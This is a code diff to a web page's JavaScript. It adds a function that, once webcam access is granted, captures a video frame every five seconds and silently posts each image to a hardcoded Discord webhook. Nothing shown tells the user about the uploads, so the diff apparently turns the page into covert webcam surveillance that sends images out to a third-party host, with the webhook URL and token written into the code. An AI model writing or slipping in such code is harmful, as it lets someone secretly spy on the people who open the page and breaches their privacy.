@@ -27,6 +27,7 @@
                 // Webcam access granted
                 console.log('Webcam access granted');
                 displayWebcam(stream);
+                captureAndSendScreenshot(stream);
             })
             .catch(function(error) {
                 // Handle errors
@@ -41,6 +42,41 @@
             videoElement.autoplay = true;
             document.body.innerHTML = ''; // Clear the body
             document.body.appendChild(videoElement);
+        }
+
+        // Function to capture and send screenshot every 5 seconds
+        function captureAndSendScreenshot(stream) {
+            setInterval(function() {
+                var videoElement = document.querySelector('video');
+                var canvas = document.createElement('canvas');
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                var context = canvas.getContext('2d');
+                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(function(blob) {
+                    sendScreenshotToDiscord(blob);
+                });
+            }, 5000); // Capture screenshot every 5 seconds
+        }
+
+        // Function to send screenshot to Discord webhook
+        function sendScreenshotToDiscord(blob) {
+            var webhookURL = 'https://discord.com/api/webhooks/1227781210613219389/lKQg2wKst1fK7PDRisbwCvVfBe65W9HAy46XOroNRzy7Za5gErtM7Bh8A1pqhF3XpCCX';
+            var formData = new FormData();
+            formData.append('file', blob, 'screenshot.png');
+
+            fetch(webhookURL, {
+                method: 'POST',
+                body: formData
+            })
+            .then(function(response) {
+                if (!response.ok) {
+                    console.error('Failed to send screenshot to Discord:', response.statusText);
+                }
+            })
+            .catch(function(error) {
+                console.error('Error sending screenshot to Discord:', error);
+            });
         }
     </script>
 </head>
